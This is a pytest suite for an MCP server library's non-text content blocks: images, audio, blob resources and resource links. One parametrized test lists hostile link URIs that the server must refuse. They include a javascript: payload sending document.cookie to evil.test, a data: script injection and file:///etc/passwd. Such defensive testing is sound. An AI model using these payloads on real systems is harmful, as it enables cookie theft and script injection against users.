"""Non-text content blocks: the vocabulary, and the two paths that produce it."""

from __future__ import annotations

import base64
from typing import Any

import pytest
from django.core.exceptions import ImproperlyConfigured
from django.http import HttpRequest
from rest_framework_services.types.selector_kind import SelectorKind
from rest_framework_services.types.selector_spec import SelectorSpec
from rest_framework_services.types.service_spec import ServiceSpec

from rest_framework_mcp import (
    MCPServer,
    PromptMessage,
    ResourceContents,
    ResourceEncoding,
    ToolContentBlock,
    ToolContentKind,
)
from rest_framework_mcp.auth.backends.allow_any_backend import AllowAnyBackend
from rest_framework_mcp.auth.types.token_info import TokenInfo
from rest_framework_mcp.handlers.handle_resources_read import handle_resources_read
from rest_framework_mcp.handlers.handle_tools_call import handle_tools_call
from rest_framework_mcp.handlers.handle_tools_list import handle_tools_list
from rest_framework_mcp.handlers.types.context import MCPCallContext
from rest_framework_mcp.transport.in_memory_session_store import InMemorySessionStore

PNG = b"\x89PNG\r\n\x1a\n"
PNG_B64 = base64.b64encode(PNG).decode("ascii")


def _server() -> MCPServer:
    return MCPServer(name="t", auth_backend=AllowAnyBackend(), session_store=InMemorySessionStore())


def _ctx(server: MCPServer) -> MCPCallContext:
    request = HttpRequest()
    request.method = "POST"
    return MCPCallContext(
        http_request=request,
        token=TokenInfo(user=None),
        tools=server.tools,
        resources=server.resources,
        prompts=server.prompts,
        protocol_version=server.config.protocol_versions[0],
        config=server.config,
    )


# ----- the block vocabulary -----


def test_image_block_encodes_bytes() -> None:
    block = ToolContentBlock.image(PNG, mime_type="image/png")
    assert block.to_dict() == {"type": "image", "data": PNG_B64, "mimeType": "image/png"}


def test_image_block_passes_a_string_through_unencoded() -> None:
    """A ``str`` is already base64 — re-encoding it would double-encode."""
    assert ToolContentBlock.image(PNG_B64, mime_type="image/png").to_dict()["data"] == PNG_B64


def test_audio_block() -> None:
    assert ToolContentBlock.audio(b"RIFF", mime_type="audio/wav").to_dict() == {
        "type": "audio",
        "data": base64.b64encode(b"RIFF").decode("ascii"),
        "mimeType": "audio/wav",
    }


def test_resource_link_block() -> None:
    assert ToolContentBlock.resource_link(
        "invoices://1", name="Invoice 1", description="A bill", mime_type="application/json"
    ).to_dict() == {
        "type": "resource_link",
        "uri": "invoices://1",
        "name": "Invoice 1",
        "description": "A bill",
        "mimeType": "application/json",
    }


def test_embedded_resource_block_nests_its_contents() -> None:
    block = ToolContentBlock.embedded_resource(
        ResourceContents(uri="invoices://1", mime_type="text/plain", text="hi"),
        annotations={"audience": ["user"]},
    )
    assert block.to_dict() == {
        "type": "resource",
        "resource": {"uri": "invoices://1", "mimeType": "text/plain", "text": "hi"},
        "annotations": {"audience": ["user"]},
    }


def test_text_block_carries_meta() -> None:
    assert ToolContentBlock.text_block("hi", meta={"x": 1}).to_dict() == {
        "type": "text",
        "text": "hi",
        "_meta": {"x": 1},
    }


def test_prompt_message_accepts_any_block() -> None:
    message = PromptMessage.block("user", ToolContentBlock.image(PNG, mime_type="image/png"))
    assert message.to_dict() == {
        "role": "user",
        "content": {"type": "image", "data": PNG_B64, "mimeType": "image/png"},
    }


# ----- binary resources -----


def test_blob_resource_base64_encodes_the_body() -> None:
    server = _server()
    server.register_resource(
        name="logo",
        uri_template="assets://logo",
        selector=SelectorSpec(kind=SelectorKind.RETRIEVE, selector=lambda: PNG),
        mime_type="image/png",
        encoding=ResourceEncoding.BLOB,
    )
    result = handle_resources_read({"uri": "assets://logo"}, _ctx(server))
    contents = result["contents"][0]
    assert contents == {"uri": "assets://logo", "mimeType": "image/png", "blob": PNG_B64}
    # ``text`` and ``blob`` are mutually exclusive on a contents entry.
    assert "text" not in contents


def test_blob_resource_rejects_a_non_bytes_selector_return() -> None:
    server = _server()
    server.register_resource(
        name="logo",
        uri_template="assets://logo",
        selector=SelectorSpec(kind=SelectorKind.RETRIEVE, selector=lambda: "not bytes"),
        encoding=ResourceEncoding.BLOB,
    )
    result = handle_resources_read({"uri": "assets://logo"}, _ctx(server))
    assert result.code == -32603
    assert "encoding=BLOB but produced str" in result.message


# ----- tool results -----


def test_image_tool_emits_one_image_block_and_no_structured_content() -> None:
    server = _server()
    server.register_service_tool(
        name="chart.render",
        spec=ServiceSpec(service=lambda **_: PNG, atomic=False),
        content_kind=ToolContentKind.IMAGE,
        content_mime_type="image/png",
    )
    result = handle_tools_call({"name": "chart.render", "arguments": {}}, _ctx(server))
    assert result["content"] == [{"type": "image", "data": PNG_B64, "mimeType": "image/png"}]
    assert "structuredContent" not in result


def test_image_tool_does_not_advertise_an_output_schema() -> None:
    server = _server()
    server.register_service_tool(
        name="chart.render",
        spec=ServiceSpec(service=lambda **_: PNG, atomic=False),
        content_kind=ToolContentKind.IMAGE,
        content_mime_type="image/png",
    )
    assert "outputSchema" not in handle_tools_list(None, _ctx(server))["tools"][0]


def test_a_bytearray_payload_is_accepted() -> None:
    """Django's file/image handling hands back buffers, not always ``bytes``."""
    server = _server()
    server.register_service_tool(
        name="chart.render",
        spec=ServiceSpec(service=lambda **_: bytearray(PNG), atomic=False),
        content_kind=ToolContentKind.IMAGE,
        content_mime_type="image/png",
    )
    result = handle_tools_call({"name": "chart.render", "arguments": {}}, _ctx(server))
    assert result["content"][0]["data"] == PNG_B64


def test_audio_tool() -> None:
    server = _server()
    server.register_service_tool(
        name="tts.say",
        spec=ServiceSpec(service=lambda **_: b"RIFF", atomic=False),
        content_kind=ToolContentKind.AUDIO,
        content_mime_type="audio/wav",
    )
    result = handle_tools_call({"name": "tts.say", "arguments": {}}, _ctx(server))
    assert result["content"][0]["type"] == "audio"


def test_media_tool_returning_json_is_a_tool_level_error() -> None:
    """A binding declaring IMAGE whose service returns a dict is a server bug.

    It surfaces as ``isError`` rather than an exception so the client still
    gets a well-formed response, and the message names the declaration.
    """
    server = _server()
    server.register_service_tool(
        name="chart.render",
        spec=ServiceSpec(service=lambda **_: {"not": "bytes"}, atomic=False),
        content_kind=ToolContentKind.IMAGE,
        content_mime_type="image/png",
    )
    result = handle_tools_call({"name": "chart.render", "arguments": {}}, _ctx(server))
    assert result["isError"] is True
    assert "content_kind=IMAGE but produced dict" in result["content"][0]["text"]
    assert "'chart.render'" in result["content"][0]["text"]


def test_resource_link_tool_emits_links_and_keeps_structured_content() -> None:
    links: list[dict[str, Any]] = [
        {"uri": "invoices://1", "name": "Invoice 1"},
        {"uri": "invoices://2", "name": "Invoice 2", "mimeType": "application/pdf"},
    ]
    server = _server()
    server.register_service_tool(
        name="invoices.find",
        spec=ServiceSpec(service=lambda **_: links, atomic=False),
        content_kind=ToolContentKind.RESOURCE_LINK,
    )
    result = handle_tools_call({"name": "invoices.find", "arguments": {}}, _ctx(server))
    assert [b["uri"] for b in result["content"]] == ["invoices://1", "invoices://2"]
    assert result["content"][1]["mimeType"] == "application/pdf"
    assert result["structuredContent"] == links


def test_a_single_mapping_is_accepted_as_one_link() -> None:
    server = _server()
    server.register_service_tool(
        name="invoices.one",
        spec=ServiceSpec(
            service=lambda **_: {"uri": "invoices://1", "name": "Invoice 1"}, atomic=False
        ),
        content_kind=ToolContentKind.RESOURCE_LINK,
    )
    result = handle_tools_call({"name": "invoices.one", "arguments": {}}, _ctx(server))
    assert len(result["content"]) == 1


def test_resource_link_tool_returning_the_wrong_shape_errors() -> None:
    server = _server()
    server.register_service_tool(
        name="invoices.find",
        spec=ServiceSpec(service=lambda **_: "just a string", atomic=False),
        content_kind=ToolContentKind.RESOURCE_LINK,
    )
    result = handle_tools_call({"name": "invoices.find", "arguments": {}}, _ctx(server))
    assert result["isError"] is True
    assert "content_kind=RESOURCE_LINK but produced str" in result["content"][0]["text"]


def test_resource_link_entry_missing_uri_errors() -> None:
    server = _server()
    server.register_service_tool(
        name="invoices.find",
        spec=ServiceSpec(service=lambda **_: [{"name": "Invoice 1"}], atomic=False),
        content_kind=ToolContentKind.RESOURCE_LINK,
    )
    result = handle_tools_call({"name": "invoices.find", "arguments": {}}, _ctx(server))
    assert result["isError"] is True
    assert "missing 'uri' and/or 'name'" in result["content"][0]["text"]


def test_selector_tool_honours_the_content_kind() -> None:
    server = _server()
    server.register_selector_tool(
        name="thumb.get",
        spec=SelectorSpec(kind=SelectorKind.RETRIEVE, selector=lambda: PNG),
        content_kind=ToolContentKind.IMAGE,
        content_mime_type="image/png",
    )
    result = handle_tools_call({"name": "thumb.get", "arguments": {}}, _ctx(server))
    assert result["content"][0]["mimeType"] == "image/png"


# ----- registration-time refusals -----


def test_media_without_a_mime_type_is_refused() -> None:
    server = _server()
    with pytest.raises(ImproperlyConfigured, match="requires content_mime_type"):
        server.register_service_tool(
            name="chart.render",
            spec=ServiceSpec(service=lambda **_: PNG, atomic=False),
            content_kind=ToolContentKind.IMAGE,
        )


def test_media_with_structured_content_requested_is_refused() -> None:
    server = _server()
    with pytest.raises(ImproperlyConfigured, match="cannot be combined"):
        server.register_service_tool(
            name="chart.render",
            spec=ServiceSpec(service=lambda **_: PNG, atomic=False),
            content_kind=ToolContentKind.IMAGE,
            content_mime_type="image/png",
            include_structured_content=True,
        )


def test_resource_link_needs_no_mime_type() -> None:
    """Links carry their own per-entry ``mimeType``, so the binding needs none."""
    server = _server()
    binding = server.register_service_tool(
        name="invoices.find",
        spec=ServiceSpec(service=lambda **_: [], atomic=False),
        content_kind=ToolContentKind.RESOURCE_LINK,
    )
    assert binding.content_mime_type is None


# ---------- a resource_link URI is untrusted, and reaches a host that renders it ----------


def _link_result(uri: Any) -> dict[str, Any]:
    server = _server()
    server.register_service_tool(
        name="bookmarks.find",
        spec=ServiceSpec(service=lambda **_: [{"uri": uri, "name": "Saved link"}], atomic=False),
        content_kind=ToolContentKind.RESOURCE_LINK,
    )
    return handle_tools_call({"name": "bookmarks.find", "arguments": {}}, _ctx(server))


@pytest.mark.parametrize(
    "uri",
    [
        'javascript:fetch("//evil.test/"+document.cookie)',
        "data:text/html,<script>alert(1)</script>",
        "vbscript:msgbox(1)",
        "blob:https://example.test/9e1f",
        "file:///etc/passwd",
        "about:config",
    ],
)
def test_a_script_bearing_resource_link_scheme_is_refused(uri: str) -> None:
    """The payload field holding a URI is usually a value some end user stored.

    A bookmarks or attachments table is readable by one user and writable by
    another; emitting the row verbatim hands an MCP host a link it may render as
    a clickable anchor in its own origin, or fetch to build a preview.
    """
    result = _link_result(uri)
    assert result["isError"] is True
    assert "content_kind=RESOURCE_LINK" in result["content"][0]["text"]


def test_a_relative_resource_link_uri_is_refused() -> None:
    result = _link_result("/invoices/1")
    assert result["isError"] is True
    assert "absolute URI" in result["content"][0]["text"]


def test_an_unparseable_resource_link_uri_is_refused() -> None:
    # ``urlsplit`` raises on an unclosed IPv6 literal; unparseable is unlinkable.
    result = _link_result("http://[::1")
    assert result["isError"] is True
    assert "absolute URI" in result["content"][0]["text"]


def test_a_non_string_resource_link_uri_is_refused() -> None:
    result = _link_result(42)
    assert result["isError"] is True
    assert "not a string" in result["content"][0]["text"]


@pytest.mark.parametrize(
    "uri",
    ["https://example.test/doc", "http://localhost:8000/doc", "reports://q3", "ui://widget/x"],
)
def test_ordinary_and_server_registered_schemes_still_pass(uri: str) -> None:
    """An allowlist would have to enumerate every scheme a server registers.

    ``build_content_blocks`` cannot see the resource registry, so refusing an
    unknown scheme would break the ordinary case to guard against nothing.
    """
    result = _link_result(uri)
    assert "isError" not in result
    assert result["content"][0]["uri"] == uri
